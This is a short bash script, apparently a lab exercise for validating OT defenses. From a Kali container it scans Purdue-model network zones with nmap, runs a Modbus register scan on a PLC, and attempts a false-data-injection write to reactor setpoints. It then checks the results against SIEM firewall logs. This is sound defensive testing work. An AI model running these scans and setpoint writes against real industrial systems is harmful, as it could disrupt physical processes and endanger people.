#!/bin/bash
# SCENARIO A: OT Network & Protocol Reconnaissance Audit

KALI_IP="192.168.100.100"
PLC_IP="192.168.95.2"

log_time() {
    echo "  [TIME] Action started at: $(date '+%Y-%m-%d %H:%M:%S.%3N')"
}

echo "==== SCENARIO A: OT Network & Protocol Reconnaissance Audit ===="

echo "[*] Step 1: Auditing IDMZ Zone (Proxies & Gateways)..."
log_time
docker exec kali nmap -Pn -p 80,443,8080 192.168.90.21 192.168.90.22
echo ""

echo "[*] Step 2: Auditing Level 3 Ops Connectivity (EWS)..."
log_time
docker exec kali nmap -Pn -p 22,80,443,3389 192.168.97.5
echo ""

echo "[*] Step 3: Auditing Level 2 Supervisory Connectivity (HMI)..."
log_time
docker exec kali nmap -Pn -p 22,80,443,3389,8080 192.168.96.10
echo ""

echo "[*] Step 4: Auditing Level 1/0 Control Connectivity (PLC)..."
log_time
docker exec kali nmap -Pn -p 22,80,443,502,8080 192.168.95.2
echo ""

echo "[*] Step 5: Launching Mdbget (Modbus Scan) to extract PLC registers..."
log_time
docker exec kali python3 /home/kali/attack_logic/tools/attack_suite.py --scan --count 5 --delay 0.5
echo ""

echo "[*] Step 6: Attempting False Data Injection (Modbus Write) to hijack Reactor Setpoints..."
log_time
docker exec kali python3 /home/kali/attack_logic/tools/attack_suite.py --fdi --reg 2 --val 55555 --count 1
echo "[+] Scenario A complete. Verify that 'Filtered' results and 'Failed' writes correspond to SIEM 'FW DROP' logs."
echo ""
